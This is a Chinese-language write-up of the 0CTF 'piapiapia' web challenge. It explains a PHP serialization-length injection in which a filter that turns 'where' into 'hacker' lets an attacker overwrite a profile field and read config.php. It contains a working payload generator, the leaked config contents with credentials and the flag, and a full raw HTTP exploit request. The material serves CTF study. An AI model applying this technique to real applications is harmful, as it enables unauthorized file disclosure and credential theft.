# piapiapia 6pts
这道题的漏洞是在于：
1. `$profile['nickname']`可以填数组，绕过检测。
2. 更新profile时，序列化后的`$profile`经过filter()过滤后，`'where'`或会变为`'hacker'`，也就是`s:5:"where";`会变成了`s:5:"hacker";`，导致长度不一样，序列化后的格式被破坏，导致反序列化失败。但我们可以精心调整where的个数和双引号的位置，就可以注入任意键值对到反序列化后的`$profile`里，而反序列化后，原代码会读取`$profile['photo']`路径的文件，返回给我们。考虑通过精心调整nickname，把`$profile['photo']`改成`'/var/www/html/config.php'`(经测试发现'../config.php'无效...)。利用以下代码生成payload和模拟这个过程:

```php
<?php

$profile['phone'] = '1';
$profile['email'] = '1';
$filename = '/var/www/html/config.php';
$len = strlen($filename);
$profile['nickname'] = array('";}s:5:"photo";s:' . $len . ':"' . $filename . '";}');
//$profile['nickname'] = array('";}s:5:"photo";O:5:"mysql":0:{}}');
$len = strlen($profile['nickname'][0]);
for($i=0; $i<$len; $i++)
    $profile['nickname'][0] = 'where' . $profile['nickname'][0];
$profile['photo'] = 'upload/' . md5('111');

function filter($string) {
    $escape = array('\'', '\\\\');
    $escape = '/' . implode('|', $escape) . '/';
    $string = preg_replace($escape, '_', $string);

    $safe = array('select', 'insert', 'update', 'delete', 'where');
    $safe = '/' . implode('|', $safe) . '/i';
    return preg_replace($safe, 'hacker', $string);
}
    
var_dump($profile);
echo "<br />";
echo filter(serialize($profile));
echo "<br />";
var_dump(unserialize(filter(serialize($profile))));
```


输出
```
array(4) {
  ["phone"]=>
  string(1) "1"
  ["email"]=>
  string(1) "1"
  ["nickname"]=>
  array(1) {
    [0]=>
    string(288) "wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:24:"/var/www/html/config.php";}"
  }
  ["photo"]=>
  string(39) "upload/698d51a19d8a121ce581499d7b701668"
}
<br />a:4:{s:5:"phone";s:1:"1";s:5:"email";s:1:"1";s:8:"nickname";a:1:{i:0;s:288:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";}s:5:"photo";s:24:"/var/www/html/config.php";}";}s:5:"photo";s:39:"upload/698d51a19d8a121ce581499d7b701668";}<br />array(4) {
  ["phone"]=>
  string(1) "1"
  ["email"]=>
  string(1) "1"
  ["nickname"]=>
  array(1) {
    [0]=>
    string(288) "hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker"
  }
  ["photo"]=>
  string(24) "/var/www/html/config.php"
}
```

可以看到最后`$profile["photo"]`被修改成了想要的值。base64解码返回值，得到：
```python
>>> print '''PD9waHAKCSRjb25maWdbJ2hvc3RuYW1lJ10gPSAnMTI3LjAuMC4xJzsKCSRjb25maWdbJ3VzZXJuYW1lJ10gPSAnMGN0Zic7CgkkY29uZmlnWydwYXNzd29yZCddID0gJ29oLW15LSoqKiotd2ViJzsKCSRjb25maWdbJ2RhdGFiYXNlJ10gPSAnMENURl9XRUInOwoJJGZsYWcgPSAnMGN0ZntmYTcxN2I0OTY0OWZiYjljMGRkMGQxNjYzNDY5YTg3MX0nOwo/Pgo='''.decode('base64')
<?php
        $config['hostname'] = '127.0.0.1';
        $config['username'] = '0ctf';
        $config['password'] = 'oh-my-****-web';
        $config['database'] = '0CTF_WEB';
        $flag = '0ctf{fa717b49649fbb9c0dd0d1663469a871}';
?>
```

payload：
```
POST /update.php HTTP/1.1
Host: 202.120.7.203:8888
Content-Length: 979
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://202.120.7.203:8888
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJPbDrUHm4bYPsH4Q
Referer: http://202.120.7.203:8888/update.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4
Cookie: PHPSESSID=qsfo7b17a6ajo5usvmkaqqi636

------WebKitFormBoundaryJPbDrUHm4bYPsH4Q
Content-Disposition: form-data; name="phone"

11111111111
------WebKitFormBoundaryJPbDrUHm4bYPsH4Q
Content-Disposition: form-data; name="email"

2@example.com
------WebKitFormBoundaryJPbDrUHm4bYPsH4Q
Content-Disposition: form-data; name="nickname[]"

wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:24:"/var/www/html/config.php";}
------WebKitFormBoundaryJPbDrUHm4bYPsH4Q
Content-Disposition: form-data; name="photo"; filename="2.gif"
Content-Type: application/octet-stream

111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
------WebKitFormBoundaryJPbDrUHm4bYPsH4Q--
```
